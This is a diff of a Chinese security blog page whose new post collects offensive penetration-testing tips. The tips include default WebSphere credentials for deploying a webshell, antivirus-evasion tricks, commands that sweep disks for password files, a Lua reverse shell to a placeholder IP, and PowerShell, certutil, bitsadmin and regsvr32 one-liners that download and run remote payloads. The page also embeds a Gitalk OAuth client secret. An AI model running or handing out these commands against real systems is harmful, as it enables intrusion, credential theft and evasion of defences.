@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sn1per-ssd.github.io">
-  <title>Tag: dedecms | Sn1pEr&#39;s blog</title>
+  <title>小tips | Sn1pEr&#39;s blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sn1pEr&#39;s blog">
-<meta property="og:url" content="https://sn1per-ssd.github.io/tags/dedecms/index.html">
+  <meta name="description" content="从师傅那里听说的一些小tips，记一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小tips">
+<meta property="og:url" content="https://sn1per-ssd.github.io/2021/03/10/%E5%B0%8Ftips/index.html">
 <meta property="og:site_name" content="Sn1pEr&#39;s blog">
+<meta property="og:description" content="从师傅那里听说的一些小tips，记一下">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-10T05:56:31.000Z">
+<meta property="article:modified_time" content="2021-08-23T15:31:54.286Z">
 <meta property="article:author" content="Sn1pEr">
+<meta property="article:tag" content="tips">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Sn1pEr&#39;s blog" type="application/atom+xml">
@@ -203,80 +208,278 @@ var _hmt = _hmt || [];
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-小tips" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/03/08/dedecms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-        <time datetime="2021-03-08T06:56:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/03/08/dedecms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">dedecms漏洞复现</a>
-	
+    <h1 class="article-title" itemprop="name">
+      小tips
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2021/03/10/%E5%B0%8Ftips/" class="archive-article-date">
+        <time datetime="2021-03-10T05:56:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-10</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.1k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">4分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>从师傅那里听说的一些小tips，记一下</p>
+<a id="more"></a>
+
+<p>内网开这<code>9443、9043、9080</code>三个端口一般是websphere。在9043加 <code>/ibm/console</code>，<br><code>wasadmin wasadmin</code>，可以部署webshell</p>
+<p>1、哥斯拉自带的sweetpotato提权模块可以直接提权执行命令，无需上传文件，防止权限过低无法执行命令。<br>2、360会 拦截sqlserver的xp_ cmdshell模块执行命令，可以通过clr执行命令绕过，在cIr的命 令中直接写执行免杀exe的代码，可以直接上线。<br>3、360企业版会秒杀go写的工具，frp, nps等代理不可用，此时用cs的代理或者冰蝎的代理可以勉强使用，需要在内网中快速打下第二台出网机器建立代理。<br>4、遇到一层代理机器通另一个网段，但是有acI策略，只能通某一个端口， 如web80端 口，此时无法通过反向代理建立二层代理，考虑使用reg等http代理工具。<br>5、weblogic使用reg隧道 工具会有bug,需要修改使用weblogic版本，但是此版本的sock通信有bug,无法连接sqlserver (可认证，但证书不能通过)<br>6、http代理走rdp协议流量太大，可能无法正常使用连接，可以考虑通过smb来建立ipc连接，写计划任务，或者将硬盘映射到跳板机来读取文件。<br>7、一个信息搜集的思路，通过fofa api提取所有靶标相关的关键字，将ur/ip提取， 使用bscan快速扫描识别。可以再对ip权重做判断，提取重要c段放入goby进行扫描。<br>8、shiro高版本的加密方式不同，需要使用aesgcm的加密方式的利用工具。<br>9、某些杀软(说的就是火*)不拦guest用户启用，加入管理员组，通过3389远程桌面连接，然后手动给自己的工具加白(狗头<br>10、servers/ AdminServer/tmp/. <em>WL. _internal/bea. _wls</em> internal/9j4dqk/war/ weblogic10.3.6的上传路径，直接<br>通过rce.上传。</p>
+<ol start="10">
+<li>指定目录下搜集各类敏感文件</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dir /a /s /b d:\&quot;*.txt&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.xml&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.mdb&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.sql&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.mdf&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.eml&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*.pst&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*conf*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*bak*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*pwd*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*pass*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*login*&quot;</span><br><span class="line">dir /a /s /b d:\&quot;*user*&quot;</span><br></pre></td></tr></table></figure>
+<p>2.指定目录下的文件中搜集各种账号密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>kali带了psexec模块 但是如果走reg隧道会无法建立ipc连接，用下面的exe扔到webshell里，使用atexec可以执行命令并且回显，适用于不出网的机器没开3389的时候来执行命令。</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<ol start="4">
+<li><p>lua反弹shell<code>lua -e &quot;local socket=require(&#39;socket&#39;);local os=require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;xx.xx.xx.xx&#39;,&#39;端口&#39;);os.execute(&#39;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code>，分享一个网站，各种各样的弹shell方法：<a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a>，还有火狐插件<code>HackTools</code></p>
+</li>
+<li><p>nmap批量探测存活<code>nmap -sP -iL ip.txt -oG ip_output.txt</code></p>
+</li>
+<li><p>补天公益<br>必须是gov或者edu，如果不是的话必须百度权重大于等于1，谷歌权重大于等于3</p>
+</li>
+<li><p>weblogic获取async路径</p>
+<p><a target="_blank" rel="noopener" href="http://x.x.x.x./_async/AsyncResponseService?info">http://x.x.x.x./_async/AsyncResponseService?info</a></p>
+</li>
+<li><p>windows远程下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEC((new-objectnet.webclient).downloadstring(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;p&#39;))&quot;</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;C:\\Windows\\Temp\\test.exe</span><br><span class="line">bitsadmin &#x2F;trasnfer n http:&#x2F;&#x2F;x.x.x.x&#x2F;test.exe C:\\Windows\\Temp\\test.exe&amp;&amp;c:\\Windows\\Temp\\test.exe</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;x.x.x.x&#x2F;r scrobj.dll</span><br></pre></td></tr></table></figure></li>
+<li><p>权限不够的时候可以读向日葵配置文件读密码 然后连接远程桌面，向日葵的配置文件权限是放开的，解密脚本：<a target="_blank" rel="noopener" href="https://github.com/wafinfo/Sunflower_get_Password">wafinfo/Sunflower_get_Password: 一款针对向日葵的识别码和验证码提取工具 (github.com)</a></p>
+</li>
+</ol>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Sn1pEr
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://sn1per-ssd.github.io/2021/03/10/小tips/" title="小tips" target="_blank">https://sn1per-ssd.github.io/2021/03/10/小tips/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">dedecms</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">tips</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        			<a href="/categories/小技巧//" class="article-tag-list-link color4">小技巧</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://sn1per-ssd.github.io/2021/03/10/%E5%B0%8Ftips/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+    <a href="/2021/03/22/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%B7/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          常见端口号
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/08/dedecms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">dedecms漏洞复现</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/gitalk/1.7.0/gitalk.css">
+<script src="https://cdn.bootcdn.net/ajax/libs/gitalk/1.7.0/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+	var gitalk = new Gitalk({
+  	clientID: 'aa4b4451b3c3cf5c9d80',
+  	clientSecret: '6e89799af07ac80e892a2244ae940e450d29c85c',
+  	repo: 'gitalk',
+  	owner: 'Sn1pEr-ssd',
+  	admin: ['Sn1pEr-ssd'],
+  	id: 'Wed Mar 10 2021 13:56:31 GMT+0800',
+  	distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+
+
+
+
+
+
+
 
 
           </div>
@@ -317,9 +520,9 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
